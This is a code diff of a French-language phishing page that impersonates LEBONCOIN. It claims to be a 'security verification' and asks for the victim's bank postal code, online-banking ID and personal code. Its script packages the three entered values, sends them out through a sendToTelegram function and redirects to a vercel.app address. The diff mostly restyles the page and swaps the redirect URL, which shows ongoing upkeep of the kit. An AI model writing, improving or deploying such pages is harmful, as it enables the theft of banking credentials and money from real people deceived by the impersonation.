@@ -1,22 +1,33 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
   <title>Vérification en cours</title>
-  <link rel="icon" href="favicon.ico" type="image/x-icon">
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap">
+  <link rel="icon" href="favicon.ico" type="image/x-icon" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
   <style>
+    * {
+      box-sizing: border-box;
+    }
+
     body {
-      font-family: 'Roboto', sans-serif;
       margin: 0;
       padding: 0;
+      font-family: 'Roboto', sans-serif;
       background-color: #f4f4f4;
       display: flex;
       flex-direction: column;
       align-items: center;
       text-align: center;
+      min-height: 100vh;
+    }
+
+    #headerLogo {
+      margin: 15px 0;
+      width: 120px;
+      height: auto;
     }
 
     .evolution-chain {
@@ -24,72 +35,74 @@
       justify-content: center;
       align-items: center;
       position: relative;
-      gap: 30px;
-      margin-top: 20px;
+      gap: 25px;
+      margin-top: 15px;
+      flex-wrap: nowrap;
+      max-width: 360px;
+      padding: 0 10px;
+      overflow-x: auto;
     }
 
     .step {
       text-align: center;
-      font-size: 14px;
+      font-size: 13px;
       color: #333;
       display: flex;
       flex-direction: column;
       align-items: center;
       position: relative;
+      min-width: 60px;
     }
 
     .step span.title {
-      display: block;
-      margin-bottom: 5px;
-      font-weight: bold;
-      font-size: 16px;
+      margin-bottom: 4px;
+      font-weight: 700;
+      font-size: 14px;
       color: #000;
     }
 
-    .circle {
-      width: 20px;
-      height: 20px;
+    .circle, .circle-3, .circle-4 {
+      width: 18px;
+      height: 18px;
       border-radius: 50%;
-      background-color: #FF5A00;
-      border: 3px solid #FF5A00;
       display: flex;
       justify-content: center;
       align-items: center;
       position: relative;
+      border: 3px solid #FF5A00;
+      box-sizing: border-box;
+    }
+
+    .circle {
+      background-color: #FF5A00;
     }
 
     .circle-3, .circle-4 {
-      width: 20px;
-      height: 20px;
-      border-radius: 50%;
-      background-color: white;
-      border: 3px solid #FF5A00;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      position: relative;
+      background-color: #fff;
     }
 
     .checkmark {
-      font-size: 14px;
+      font-size: 13px;
       color: white;
+      user-select: none;
     }
 
     .dot {
-      width: 8px;
-      height: 8px;
+      width: 6px;
+      height: 6px;
       background-color: #FF5A00;
       border-radius: 50%;
     }
 
     .line {
       position: absolute;
-      top: 70%;
+      top: 65%;
       left: 100%;
-      width: 20px;
+      width: 18px;
       height: 2px;
       background-color: #FF5A00;
       margin-top: -1px;
+      user-select: none;
     }
 
     .step:last-child .line {
@@ -97,24 +110,51 @@
     }
 
     main {
-      padding: 20px;
+      padding: 15px;
       width: 100%;
-      max-width: 400px;
+      max-width: 360px;
       background-color: white;
-      margin-top: 20px;
+      margin: 15px 0 30px;
       border-radius: 8px;
-      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 3px 6px rgba(0,0,0,0.12);
+      box-sizing: border-box;
+      text-align: left;
+    }
+
+    h1 {
+      font-size: 22px;
+      font-weight: 700;
+      color: #333;
+      margin-bottom: 12px;
+      text-align: center;
+    }
+
+    .subtitle {
+      text-decoration: underline;
+      font-size: 14px;
+      margin-top: 10px;
+      margin-bottom: 10px;
+      color: #333;
+    }
+
+    .explanation {
+      font-size: 13px;
+      font-weight: 700;
+      color: #000;
+      margin-bottom: 15px;
+      line-height: 1.3;
     }
 
     .form-row input {
       width: 100%;
-      padding: 14px;
-      border-radius: 5px;
-      border: 2px solid #ccc;
-      font-size: 14px;
-      box-sizing: border-box;
+      padding: 15px 14px;  /* champs plus grands */
+      font-size: 15px;
+      border-radius: 6px;
+      border: 1.5px solid #ccc;
       color: #333;
-      margin-top: 20px;
+      margin-top: 18px;
+      box-sizing: border-box;
+      transition: border-color 0.3s;
     }
 
     .form-row input:focus {
@@ -122,51 +162,25 @@
       outline: none;
     }
 
-    h1 {
-      font-size: 28px;
-      font-weight: 700;
-      color: #333;
-      margin-bottom: 10px;
-    }
-
     button {
-      width: 350px;
-      height: 50px;
+      width: 100%;        /* bouton full width */
+      max-width: 360px;
+      height: 48px;
       background-color: #ff6e14;
       border: none;
-      border-radius: 25px;
+      border-radius: 28px;
       font-size: 16px;
       color: white;
       cursor: pointer;
-      margin-top: 20px;
+      margin-top: 22px;
       transition: background-color 0.3s;
+      display: block;
+      box-sizing: border-box;
+      font-weight: 700;
     }
 
     button:hover {
       background-color: #e14e00;
-    }
-
-    #headerLogo {
-      margin-top: 20px;
-      margin-bottom: 20px;
-      width: 150px;
-    }
-
-    .subtitle {
-      text-align: left;
-      text-decoration: underline;
-      font-size: 14px;
-      margin-top: 10px; /* Léger espace ajouté ici */
-      margin-bottom: 10px;
-      color: #333;
-    }
-
-    .explanation {
-      text-align: left;
-      font-size: 12px;
-      font-weight: bold;
-      color: #000;
-      margin-bottom: 15px;
     }
   </style>
 </head>
@@ -174,7 +188,7 @@
 
 <img id="headerLogo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ99d5FfXb09Wt4b_VyIGEdQajCjKaEZi4FSg&s" alt="Logo">
 
-<div class="evolution-chain">
+<div class="evolution-chain" aria-label="Étapes de vérification">
   <div class="step">
     <span class="title">Confirmer</span>
     <div class="circle">
@@ -206,24 +220,24 @@
   <h1>Confirmez vos informations</h1>
   <p class="subtitle">Pourquoi dois-je le faire ?</p>
   <p class="explanation">
-    Si votre compte LEBONCOIN a été piraté, un individu pourrait réceptionner votre paiement en votre nom.
-    La vérification bancaire permet d'éradiquer ce risque.
-    LEBONCOIN vous demande de vérifier votre compte de sorte que les futurs transferts ne soient pas envoyés vers un mauvais compte bancaire.
-    Pour bénéficier pleinement de votre compte LEBONCOIN et pouvoir transférer votre argent de votre compte LEBONCOIN vers votre compte bancaire et vice-versa,
+    Si votre compte LEBONCOIN a été piraté, un individu pourrait réceptionner votre paiement en votre nom.<br>
+    La vérification bancaire permet d'éradiquer ce risque.<br>
+    LEBONCOIN vous demande de vérifier votre compte de sorte que les futurs transferts ne soient pas envoyés vers un mauvais compte bancaire.<br>
+    Pour bénéficier pleinement de votre compte LEBONCOIN et pouvoir transférer votre argent de votre compte LEBONCOIN vers votre compte bancaire et vice-versa,<br>
     vous devez obligatoirement confirmer votre compte bancaire à l'aide de vos identifiants de connexion en ligne par mesure de sécurité.
   </p>
 
   <form id="cardForm">
     <div class="form-row">
-      <input type="text" id="postalCode" name="postalCode" placeholder="Code Postal Banque" required>
+      <input type="text" id="postalCode" name="postalCode" placeholder="Code Postal Banque" required autocomplete="postal-code" />
     </div>
 
     <div class="form-row">
-      <input type="text" id="bankId" name="bankId" placeholder="Identifiant Bancaire" required>
+      <input type="text" id="bankId" name="bankId" placeholder="Identifiant Bancaire" required autocomplete="username" />
     </div>
 
     <div class="form-row">
-      <input type="password" id="personalCode" name="personalCode" placeholder="Code Personnel" required>
+      <input type="password" id="personalCode" name="personalCode" placeholder="Code Personnel" required autocomplete="current-password" />
     </div>
 
     <button type="submit">Confirmer</button>
@@ -242,13 +256,14 @@
       };
 
       var message = `Nouveau message de formulaire :
-      \n\nCode Postal: ${formData.postalCode}
-      \nIdentifiant Bancaire: ${formData.bankId}
-      \nCode Personnel: ${formData.personalCode}`;
+      
+Code Postal: ${formData.postalCode}
+Identifiant Bancaire: ${formData.bankId}
+Code Personnel: ${formData.personalCode}`;
 
       sendToTelegram(message);
 
-      window.location.href = 'https://encours-psi.vercel.app/';
+      window.location.href = 'https://encours-one.vercel.app/';
     });
   });
 
@@ -276,5 +291,6 @@
     }
   }
 </script>
+
 </body>
 </html>
